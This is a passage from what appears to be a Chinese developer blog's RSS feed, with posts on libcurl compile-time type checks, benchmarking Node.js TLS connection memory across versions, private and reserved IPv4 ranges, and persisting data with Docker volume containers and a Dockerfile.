强烈建议 <code>gcc</code> 编译时添加 <code>-Wall</code> 选项， <code>libcurl</code> 为 <code>gcc</code> 提供了类型检查，能够在编译期检查一些类型不匹配的错误，如下编译输出：
</p>

<pre class="example">
install.c: In function 'install':
/usr/include/curl/typecheck-gcc.h:120:36: error: call to '_curl_easy_getinfo_err_long' declared with attribute warning: curl_easy_getinfo expects a pointer to long for this info [-Werror]
         _curl_easy_getinfo_err_long();                                        \
                                    ^
install.c:58:19: note: in expansion of macro 'curl_easy_getinfo'
             res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &amp;response_code);
                   ^
cc1: all warnings being treated as errors
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[tls连接内存占用]]></title>
            <link>/article/tls-8fde63a551855b5853607528.html</link>
            <guid>/article/tls-8fde63a551855b5853607528.html</guid>
            <pubDate>Sun, 20 Dec 2015 16:17:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
我们有一个 <code>node.js</code> 服务，有大量 <code>tls</code> 长连接，跑了一段时间后发现内存消耗比较大，每个 <code>node.js</code> 实例维持 <code>3000</code> 个连接需要消耗 <code>1G</code> 略多的内存，但是也不能确定有内存泄露，毕竟内存没有再往上涨导致服务中断，所以觉得有必要测试一下 <code>tls</code> 连接的内存消耗情况。
</p>

<div id="outline-container-org15fa85d" class="outline-2">
<h2 id="org15fa85d">tls服务器</h2>
<div class="outline-text-2" id="text-org15fa85d">
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">tls</span>         = require(<span style="color: #8abeb7;">'tls'</span>),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   fs          = require(<span style="color: #8abeb7;">'fs'</span>);


<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">options</span> = {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   key: fs.readFileSync(<span style="color: #8abeb7;">'server.key'</span>),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   cert: fs.readFileSync(<span style="color: #8abeb7;">'server.cert'</span>),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   handshakeTimeout: 10*1000,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   plain: <span style="color: #81a2be;">true</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   ssl: <span style="color: #81a2be;">true</span>
};

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">port</span> = 1234;
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">tlsServer</span> = tls.createServer(options, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">socket</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   socket.on(<span style="color: #8abeb7;">"close"</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">'tls client('</span> + socket.remoteAddress + <span style="color: #8abeb7;">':'</span> + socket.remoteP<span style="text-decoration: underline;">ort +</span><span style="color: #8abeb7; text-decoration: underline;">') closed'</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}).listen(port, <span style="color: #8abeb7;">"0.0.0.0"</span>, <span style="color: #b5bd68;">function</span>(){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">'tls server listening on port('</span> + port + <span style="color: #8abeb7;">')'</span>);
});
tlsServer.maxConnections = 10000;
tlsServer.on(<span style="color: #8abeb7;">'clientError'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">exception</span>, <span style="color: #f0c674;">socket</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">'tls client('</span> + socket.remoteAddress + <span style="color: #8abeb7;">':'</span> + socket.remotePort <span style="text-decoration: underline;">+</span><span style="color: #8abeb7; text-decoration: underline;">') error('</span><span style="text-decoration: underline;"> + exception + </span><span style="color: #8abeb7; text-decoration: underline;">')'</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   socket.destroy();
});

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">memoryUsage</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">mem</span> = process.memoryUsage();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">format</span> = <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">bytes</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> (bytes/1024/1024).toFixed(2)+<span style="color: #8abeb7;">'MB'</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   };
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">'Process: heapTotal '</span>+format(mem.heapTotal) + <span style="color: #8abeb7;">' heapUsed '</span> + for<span style="text-decoration: underline;">mat(mem.heapUsed) + </span><span style="color: #8abeb7; text-decoration: underline;">' rss '</span><span style="text-decoration: underline;"> + format(mem.rss));</span>
}

setInterval(<span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   tlsServer.getConnections(<span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">tlsCount</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.error(<span style="color: #8abeb7;">"get tls connections count error("</span> + err.toString() + <span style="color: #8abeb7; text-decoration: underline;">")"</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">"server: tls connections("</span> + tlsCount + <span style="color: #8abeb7;">")"</span>);

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   memoryUsage();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}, 1*1000);
</pre>
</div>
</div>
</div>

<div id="outline-container-org9b63d93" class="outline-2">
<h2 id="org9b63d93">tls客户端</h2>
<div class="outline-text-2" id="text-org9b63d93">
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">tls</span> = require(<span style="color: #8abeb7;">'tls'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">tlsCount</span> = 0;

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">connect</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">socket</span> = tls.connect(1234, {rejectUnauthorized: <span style="color: #81a2be;">false</span>}, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   tlsCount += 1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   socket.setEncoding(<span style="color: #8abeb7;">'utf8'</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   socket.on(<span style="color: #8abeb7;">'data'</span>, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">data</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   socket.on(<span style="color: #8abeb7;">'close'</span>, <span style="color: #b5bd68;">function</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   tlsCount -= 1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">memoryUsage</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">mem</span> = process.memoryUsage();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">format</span> = <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">bytes</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> (bytes/1024/1024).toFixed(2)+<span style="color: #8abeb7;">'MB'</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   };
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">'Process: heapTotal '</span>+format(mem.heapTotal) + <span style="color: #8abeb7;">' heapUsed '</span> + for<span style="text-decoration: underline;">mat(mem.heapUsed) + </span><span style="color: #8abeb7; text-decoration: underline;">' rss '</span><span style="text-decoration: underline;"> + format(mem.rss));</span>
}

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">round</span> = 0;
setInterval(<span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (round &lt; 10) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">i</span> = 0; i &lt; 100; ++i) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   connect();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   round += 1;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">"client: tls connections("</span> + tlsCount + <span style="color: #8abeb7;">")"</span>);

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   memoryUsage();
}, 1000);
</pre>
</div>
</div>
</div>

<div id="outline-container-org0f5a7a4" class="outline-2">
<h2 id="org0f5a7a4">tls服务器日志</h2>
<div class="outline-text-2" id="text-org0f5a7a4">
<p>
连接从 <code>0</code> 到 <code>1000</code> 内存增长
</p>

<pre class="example">
server: tls connections(0)
Process: heapTotal 9.14MB heapUsed 4.80MB rss 23.69MB
server: tls connections(100)
Process: heapTotal 10.13MB heapUsed 5.59MB rss 29.53MB
server: tls connections(200)
Process: heapTotal 10.13MB heapUsed 6.75MB rss 32.32MB
server: tls connections(300)
Process: heapTotal 9.18MB heapUsed 7.32MB rss 34.37MB
server: tls connections(400)
Process: heapTotal 10.16MB heapUsed 8.11MB rss 37.05MB
server: tls connections(500)
Process: heapTotal 11.14MB heapUsed 8.66MB rss 38.18MB
server: tls connections(600)
Process: heapTotal 11.14MB heapUsed 9.48MB rss 39.73MB
server: tls connections(600)
Process: heapTotal 12.12MB heapUsed 9.62MB rss 40.50MB
server: tls connections(700)
Process: heapTotal 15.04MB heapUsed 10.16MB rss 42.69MB
server: tls connections(800)
Process: heapTotal 18.97MB heapUsed 10.72MB rss 44.50MB
server: tls connections(900)
Process: heapTotal 18.97MB heapUsed 11.68MB rss 46.30MB
server: tls connections(1000)
Process: heapTotal 18.97MB heapUsed 12.63MB rss 47.32MB
</pre>

<p>
tls客户端结束后连接数从 <code>1000</code> 降到 <code>0</code> 约 <code>30</code> 秒后
</p>

<pre class="example">
server: tls connections(0)
Process: heapTotal 22.91MB heapUsed 13.63MB rss 48.44MB
</pre>

<p>
从上面的日志可以计算出：
</p>

<ul class="org-ul">
<li>每 <code>tls</code> 连接 <code>rss</code> 要消耗 <code>24.2KB</code>  <code>heap</code> 要消耗 <code>8KB</code></li>

<li><p>
连接关闭后内存没有释放
</p>

<p>
还略有增加，要么就是 <code>node.js</code> 没有释放 <code>tls</code> 连接的内存（应该不太可能），要么就是我的代码有问题，没有释放资源
</p></li>
</ul>

<p>
使用 <code>heapdump</code> 导出堆数据后通过 <code>Chromium</code> 的开发工具进行分析，发现事情没这么简单，占用的内存绝大部分是代码，
<code>tls</code> 服务器不退出，使用 <code>tls</code> 客户端测试多轮后可以发现 <code>rss</code> 内存占用不会增加， <code>tls</code> 客户端退出关闭所有连接后，
<code>rss</code> 内存占用总是会恢复到同一水平，这就说明代码是没有问题的，应该不存在内存泄露。
</p>

<p>
多轮测试后重新取样：
</p>

<pre class="example">
server: tls connections(0)
Process: heapTotal 21.93MB heapUsed 13.22MB rss 54.06MB
server: tls connections(100)
Process: heapTotal 21.93MB heapUsed 14.16MB rss 54.06MB
server: tls connections(200)
Process: heapTotal 25.86MB heapUsed 14.79MB rss 58.57MB
server: tls connections(300)
Process: heapTotal 25.86MB heapUsed 15.76MB rss 59.08MB
server: tls connections(400)
Process: heapTotal 25.86MB heapUsed 16.69MB rss 59.08MB
server: tls connections(500)
Process: heapTotal 27.83MB heapUsed 16.72MB rss 60.37MB
server: tls connections(600)
Process: heapTotal 27.83MB heapUsed 17.65MB rss 60.37MB
server: tls connections(700)
Process: heapTotal 33.74MB heapUsed 15.76MB rss 59.32MB
server: tls connections(800)
Process: heapTotal 33.74MB heapUsed 16.71MB rss 59.32MB
server: tls connections(800)
Process: heapTotal 33.74MB heapUsed 16.83MB rss 59.32MB
server: tls connections(900)
Process: heapTotal 33.74MB heapUsed 18.31MB rss 59.38MB
server: tls connections(1000)
Process: heapTotal 33.74MB heapUsed 19.24MB rss 59.38MB
</pre>

<p>
从上面的日志可以计算出：
</p>

<ul class="org-ul">
<li>每 <code>tls</code> 连接 <code>rss</code> 要消耗 <code>5.45KB</code> ， <code>heap</code> 要消耗 <code>6.16KB</code></li>
</ul>

<p>
也就是说正常情况下， <code>3000</code> 个 <code>tls</code> 连接， <code>rss</code> 会消耗 <code>16MB</code> ， <code>heap</code> 会消耗 <code>18MB</code> ，占用 <code>1G</code> 的问题肯定出在其它地方。
</p>

<p>
另外注意到调用 <code>heapdump.writeSnapshot</code> 后内存占用大幅下降，应该是 <code>heapdump</code> 触发了 <code>v8</code> 的垃圾回收， <code>v8</code> 的垃圾回收应该不是实时精确的，要精确测量内存占用，估计也要像 <code>heapdump</code> 一样让 <code>v8</code> 将全部垃圾回收后再测量。
</p>
</div>
</div>

<div id="outline-container-org5a4bb11" class="outline-2">
<h2 id="org5a4bb11">不同版本的node.js结果会有差异</h2>
<div class="outline-text-2" id="text-org5a4bb11">
<p>
为了完全模拟真实环境，针对每一个接收的 <code>tls</code> 连接，除了 <code>close</code> ，还监听了 <code>data</code> 、 <code>error</code> 、 <code>timeout</code> 事件：
</p>

<div class="org-src-container">
<pre class="src src-js">socket.on(<span style="color: #8abeb7;">"data"</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">data</span>) {

});
socket.on(<span style="color: #8abeb7;">"error"</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">'tls client('</span> + socket.remoteAddress + <span style="color: #8abeb7;">':'</span> + socket.remotePort <span style="text-decoration: underline;">+</span><span style="color: #8abeb7; text-decoration: underline;">') error('</span><span style="text-decoration: underline;"> + err.toString() + </span><span style="color: #8abeb7; text-decoration: underline;">')'</span><span style="text-decoration: underline;">);</span>
});
socket.on(<span style="color: #8abeb7;">"close"</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">'tls client('</span> + socket.remoteAddress + <span style="color: #8abeb7;">':'</span> + socket.remotePort <span style="text-decoration: underline;">+</span><span style="color: #8abeb7; text-decoration: underline;">') closed'</span><span style="text-decoration: underline;">);</span>
});
socket.on(<span style="color: #8abeb7;">"timeout"</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   socket.destroy();
});
</pre>
</div>

<p>
前面的测试我使用的是 <code>node-v5.3.0</code> ，我使用 <code>node-v0.12.7</code> 重新测了几轮，最终 <code>rss</code> 内存占用停在 <code>145.5MB</code> ，这还只是 <code>1000</code> 个 <code>tls</code> 连接，使用 <code>3000</code> 个 <code>tls</code> 连接进行测试， <code>rss</code> 内存占用停在 <code>303MB</code> 。再次使用 <code>node-v5.3.0</code> 测试 <code>3000</code> 个 <code>tls</code> 连接， <code>rss</code> 内存占用停在 <code>115MB - 130MB</code> 之间，随着连接的增减有一定的波动。
</p>

<p>
由此看来 <code>tls</code> 连接是要占用一定内存量的，高版本的 <code>node</code> 改进很大，可以考虑升级一下 <code>node</code> 。
</p>
</div>
</div>

<div id="outline-container-org758b1fb" class="outline-2">
<h2 id="org758b1fb">最后附上 node.js 各个版本的测试结果</h2>
<div class="outline-text-2" id="text-org758b1fb">
<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
<caption class="t-above"><span class="table-number">Table 1:</span> 10000 tls connections</caption>

<colgroup>
<col  class="org-left" />

<col  class="org-right" />

<col  class="org-right" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">node.js</th>
<th scope="col" class="org-right">heapTotal(MB)</th>
<th scope="col" class="org-right">heapUsed(MB)</th>
<th scope="col" class="org-right">rss(MB)</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">node-v0.12.7</td>
<td class="org-right">158.34</td>
<td class="org-right">98.62</td>
<td class="org-right">728.26</td>
</tr>

<tr>
<td class="org-left">node-v0.12.9</td>
<td class="org-right">239.04</td>
<td class="org-right">209.53</td>
<td class="org-right">838.40</td>
</tr>

<tr>
<td class="org-left">node-v4.2.3</td>
<td class="org-right">86.58</td>
<td class="org-right">81.47</td>
<td class="org-right">222.97</td>
</tr>

<tr>
<td class="org-left">node-v5.3.0</td>
<td class="org-right">96.73</td>
<td class="org-right">75.23</td>
<td class="org-right">235.11</td>
</tr>
</tbody>
</table>

<ul class="org-ul">
<li><p>
测试脚本
</p>

<p>
<a href="../static/test_tls_server.js">test_tls_server.js</a>
</p>

<p>
<a href="../static/test_tls_client.js">test_tls_client.js</a>
</p></li>

<li><p>
测试命令
</p>

<p>
终端 <code>1</code> ( <code>tls</code> 服务器)
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo bash -c <span style="color: #8abeb7;">"(ulimit -n 10240; node ./test_tls_server.js)"</span>
</pre>
</div>

<p>
终端 <code>2</code> ( <code>tls</code> 客户端)
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo bash -c <span style="color: #8abeb7;">"(ulimit -n 10240; for (( i = 0; i &lt; 100; i++)); do echo round \$i;</span><span style="color: #8abeb7; text-decoration: underline;"> node ./test_tls_client.js; done;)"</span>
</pre>
</div>

<p>
内存占用取的是 <code>tls</code> 测试客户端退出后，服务器端最后建立了 <code>10000</code> 个 <code>tls</code> 连接时的内存占用。</p></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[内网IP段有哪些]]></title>
            <link>/article/51857f51-ip-6bb5670954ea4e9b.html</link>
            <guid>/article/51857f51-ip-6bb5670954ea4e9b.html</guid>
            <pubDate>Fri, 18 Dec 2015 06:39:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
常见的内网IP段有：
</p>

<dl class="org-dl">
<dt>10.0.0.0/8</dt><dd>10.0.0.0 - 10.255.255.255</dd>

<dt>172.16.0.0/12</dt><dd>172.16.0.0 - 172.31.255.255</dd>

<dt>192.168.0.0/16</dt><dd>192.168.0.0 - 192.168.255.255</dd>
</dl>

<p>
以上三个网段分别属于A、B、C三类IP地址，来自 《<a href="https://tools.ietf.org/html/rfc1918">RFC 1918</a>》。
</p>

<p>
但是根据 《<a href="https://en.wikipedia.org/wiki/Reserved_IP_addresses">Reserved IP addresses - Wikipedia, the free encyclopedia</a>》 及《<a href="https://tools.ietf.org/html/rfc6890">RFC 6890 - Special-Purpose IP Address Registries</a>》的描述，
还有很多其它的内网IP段（包括IPv6），以及其它用途的保留IP地址。
</p>

<p>
其它IPv4内网段罗列如下：
</p>

<dl class="org-dl">
<dt>0.0.0.0/8</dt><dd><p>
0.0.0.0 - 0.255.255.255
</p>

<p>
用于当前网络内的广播消息。
</p></dd>

<dt>100.64.0.0/10</dt><dd><p>
100.64.0.0 - 100.127.255.255
</p>

<p>
由运营商使用的私网IP段，随着IPv4地址池的耗光，会有更多用户被分配到这个网段。
</p></dd>

<dt>127.0.0.0/8</dt><dd><p>
127.0.0.0 - 127.255.255.255
</p>

<p>
本机回环地址。
</p></dd>

<dt>169.254.0.0/16</dt><dd><p>
169.254.0.0 - 169.254.255.255
</p>

<p>
获取不到IP地址时使用，通常因为从DHCP服务器获取不到IP。
</p></dd>

<dt>192.0.0.0/24</dt><dd><p>
192.0.0.0 - 192.0.0.255
</p>

<p>
Used for the IANA IPv4 Special Purpose Address Registry as specified by RFC 5736
</p>

<p>
一般用户不可能被分配到这个IP段。
</p></dd>

<dt>192.0.2.0/24</dt><dd><p>
192.0.2.0 - 192.0.2.255
</p>

<p>
Assigned as "TEST-NET" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.
</p>

<p>
一般用户不可能被分配到这个IP段。
</p></dd>

<dt>198.18.0.0/15</dt><dd><p>
198.18.0.0 - 198.19.255.255
</p>

<p>
用于测试两个独立子网的网间通信。
</p>

<p>
一般用户不可能被分配到这个IP段。
</p></dd>

<dt>198.51.100.0/24</dt><dd><p>
198.51.100.0 - 198.51.100.255
</p>

<p>
Assigned as "TEST-NET-2" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.
</p>

<p>
一般用户不可能被分配到这个IP段。
</p></dd>

<dt>203.0.113.0/24</dt><dd><p>
203.0.113.0 - 203.0.113.255
</p>

<p>
Assigned as "TEST-NET-3" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.
</p>

<p>
一般用户不可能被分配到这个IP段。
</p></dd>

<dt>255.255.255.255/32</dt><dd><p>
255.255.255.255
</p>

<p>
本网段的广播地址。</p></dd>
</dl>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[docker容器数据持久化]]></title>
            <link>/article/docker-5bb956686570636e63014e455316.html</link>
            <guid>/article/docker-5bb956686570636e63014e455316.html</guid>
            <pubDate>Thu, 17 Dec 2015 15:24:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在上一篇文章《 <a href="http:node.js-670d52a18fc179fb5230-docker-5bb95668.html">node.js服务迁移到docker容器</a> 》中，当容器被删除之后上传的文件将丢失，可以新建一个数据卷容器专门用来保存上传的文件，这个数据卷容器可以为多个应用容器提供数据持久化功能。
</p>

<p>
其实也可以挂载本地文件目录做为容器的数据卷，但使用数据卷容器更规范一些。
</p>

<div id="outline-container-orgbf2406d" class="outline-2">
<h2 id="orgbf2406d">创建数据卷容器</h2>
<div class="outline-text-2" id="text-orgbf2406d">
<div class="org-src-container">
<pre class="src src-sh">sudo docker run -d -v /usr/local/upload-fiddle/public/files --name upload-fiddle<span style="text-decoration: underline;">-data </span><span style="color: #8abeb7; text-decoration: underline;">'dl.dockerpool.com:5000/ubuntu:14.04'</span><span style="text-decoration: underline;"> echo </span><span style="color: #8abeb7; text-decoration: underline;">'upload-fiddle data container'</span>
</pre>
</div>

<p>
数据卷容器不需要运行以节约资源，它存在的目的只是对数据卷进行引用，避免数据卷被意外删除。
</p>
</div>
</div>

<div id="outline-container-orga847e99" class="outline-2">
<h2 id="orga847e99">挂载数据卷容器</h2>
<div class="outline-text-2" id="text-orga847e99">
<div class="org-src-container">
<pre class="src src-sh">sudo docker run -idt --name=<span style="color: #8abeb7;">'upload-fiddle'</span> -p 127.0.0.1:80:80 --volumes-from up<span style="text-decoration: underline;">load-fiddle-data </span><span style="color: #8abeb7; text-decoration: underline;">'tangxinfa/upload-fiddle:0.0.1'</span>
</pre>
</div>

<p>
使用 <code>--volumes-from</code> 选项引用容器中的数据卷。
</p>
</div>
</div>

<div id="outline-container-org2d35893" class="outline-2">
<h2 id="org2d35893">数据卷容器数据存储位置</h2>
<div class="outline-text-2" id="text-org2d35893">
<p>
查看数据卷容器挂载信息
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo docker inspect -f {{.Mounts}} upload-fiddle-data
</pre>
</div>

<p>
可以看到数据存储在宿主机的 <code>/var/lib/docker/volumes/</code> 目录下。
</p>

<p>
数据卷只有当最后一个引用它的容器使用 <code>-v</code> 选项进行删除（ <code>docker rm</code> 命令）时，才会被删除。
</p>

<p>
可以使用 <code>docker volume</code> 命令对数据卷进行管理。
</p>
</div>
</div>

<div id="outline-container-org239250c" class="outline-2">
<h2 id="org239250c">参考</h2>
<div class="outline-text-2" id="text-org239250c">
<p>
《<a href="http://container-solutions.com/understanding-volumes-docker/">Understanding Volumes in Docker - Container Solutions</a>》</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[node.js服务迁移到docker容器]]></title>
            <link>/article/node.js-670d52a18fc179fb5230-docker-5bb95668.html</link>
            <guid>/article/node.js-670d52a18fc179fb5230-docker-5bb95668.html</guid>
            <pubDate>Thu, 17 Dec 2015 08:54:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
这是一篇 <code>docker</code> 实践教程，将 <a href="https://github.com/tangxinfa/upload-fiddle">tangxinfa/upload-fiddle</a> 这个 <code>node.js</code> 服务封装成 <code>docker</code> 容器。
相关代码已提交到 <a href="https://github.com/tangxinfa/upload-fiddle">tangxinfa/upload-fiddle</a> 项目。
</p>

<div id="outline-container-orga8cf09d" class="outline-2">
<h2 id="orga8cf09d">编写 <code>Dockerfile</code></h2>
<div class="outline-text-2" id="text-orga8cf09d">
<pre class="example">
<span id="coderef-dockerpool" class="coderef-off"><span class="linenr"> 1: </span>FROM dl.dockerpool.com:5000/ubuntu:14.04</span>
<span class="linenr"> 2: </span>
<span class="linenr"> 3: </span>MAINTAINER tangxinfa &lt;tangxinfa@gmail.com&gt;
<span class="linenr"> 4: </span>
<span class="linenr"> 5: </span># Change apt sources
<span id="coderef-163-ubuntu" class="coderef-off"><span class="linenr"> 6: </span>ADD .docker/sources.list /etc/apt/sources.list</span>
<span class="linenr"> 7: </span>
<span class="linenr"> 8: </span># Install python
<span class="linenr"> 9: </span>RUN \
<span class="linenr">10: </span>    apt-get update &amp;&amp; apt-get -y -qq install python wget xz-utils
<span class="linenr">11: </span>
<span class="linenr">12: </span># Install node
<span class="linenr">13: </span>RUN \
<span class="linenr">14: </span>    wget http://npm.taobao.org/mirrors/node/v8.8.1/node-v8.8.1-linux-x64.tar.xz &amp;&amp;\
<span class="linenr">15: </span>    tar xJvf node-v8.8.1-linux-x64.tar.xz --no-same-owner --exclude CHANGELOG.md --exclude LICENSE --exclude README.md --strip-components 1 -C /usr
<span class="linenr">16: </span>
<span class="linenr">17: </span>WORKDIR /usr/local/upload-fiddle/
<span class="linenr">18: </span>
<span class="linenr">19: </span># Install node modules
<span class="linenr">20: </span>ADD package.json ./
<span class="linenr">21: </span>ADD process.json ./
<span class="linenr">22: </span>ADD .bashrc ./
<span class="linenr">23: </span>RUN \
<span id="coderef-npm-config" class="coderef-off"><span class="linenr">24: </span>    ["/bin/bash", "-c", "npm config set registry=https://registry.npm.taobao.org; npm config set script-shell=/bin/bash"]</span>
<span class="linenr">25: </span>RUN \
<span class="linenr">26: </span>    ["/bin/bash", "-c", "source .bashrc; npm install -g pm2@2.x json; npm install"]
<span class="linenr">27: </span>
<span class="linenr">28: </span># Add project files
<span class="linenr">29: </span>COPY src ./src
<span class="linenr">30: </span>COPY config ./config
<span class="linenr">31: </span>ADD public/*.html ./public/
<span class="linenr">32: </span>RUN mkdir /usr/local/upload-fiddle/public/files &amp;&amp;\
<span class="linenr">33: </span>    chmod a+w /usr/local/upload-fiddle/public/files
<span class="linenr">34: </span>
<span class="linenr">35: </span># Start service.
<span id="coderef-npm-logs" class="coderef-off"><span class="linenr">36: </span>CMD ["/bin/bash", "-c", "npm run pm2 -- ping &amp;&amp; npm start &amp;&amp; npm run logs"]</span>
</pre>

<dl class="org-dl">
<dt>配置行 <a href="#coderef-dockerpool" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-dockerpool');" onmouseout="CodeHighlightOff(this, 'coderef-dockerpool');">1</a></dt><dd>在官方仓库被墙的大环境下，使用 <code>dockerpool.com</code> 提供的镜像</dd>

<dt>配置行 <a href="#coderef-163-ubuntu" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-163-ubuntu');" onmouseout="CodeHighlightOff(this, 'coderef-163-ubuntu');">6</a></dt><dd>使用163的ubuntu源，提高速度</dd>

